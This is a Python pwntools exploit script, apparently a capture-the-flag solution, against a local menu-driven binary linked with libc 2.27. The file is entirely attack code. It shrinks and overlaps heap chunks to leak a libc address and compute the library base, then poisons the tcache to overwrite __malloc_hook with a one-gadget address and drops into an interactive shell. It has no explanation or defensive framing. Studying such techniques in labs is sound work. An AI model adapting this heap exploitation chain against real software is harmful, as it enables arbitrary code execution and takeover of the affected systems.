from pwn import *

p = process('./program')
elf = ELF('program')
libc = ELF('libc-2.27.so')
context.log_level = 'debug'

def create(size,content):
    p.sendlineafter('Your choice: ','1')
    p.sendlineafter('Size:',str(size))
    p.sendafter('Data:',content)

def show(index) :
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter('Index:',str(index))

def delete(index) :
    p.sendlineafter('Your choice: ','3')
    p.sendlineafter('Index:',str(index))

create(0x500, 'a' * 0x4ff)
create(0x68, 'b' * 0x67)
create(0x5f0, 'c' * 0x5ef)
create(0x20, 'd' * 0x20)
delete(1)
delete(0)
for i in range(9):
    create(0x68 - i, 'b' * (0x68 - i))
    delete(0)
create(0x68,'b'*0x60+p64(0x580))
#gdb.attach(p)
delete(2)
#gdb.attach(p)
create(0x508,'a'*0x507)
#gdb.attach(p)
show(0)
#gdb.attach(p)

data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 4111520
print 'libc_base :' + hex(libc_base)

create(0x68,'b'*0x67)
delete(0)
delete(2)

malloc_addr = libc_base + libc.symbols['__malloc_hook']
one_addr = libc_base + 0x4f322
create(0x68,p64(malloc_addr)+0x5f*'a')
create(0x68,'a'*0x67)
create(0x68,p64(one_addr))
print hex(malloc_addr)

p.sendlineafter('Your choice: ','1')
p.sendlineafter('Size:','10')

p.interactive()
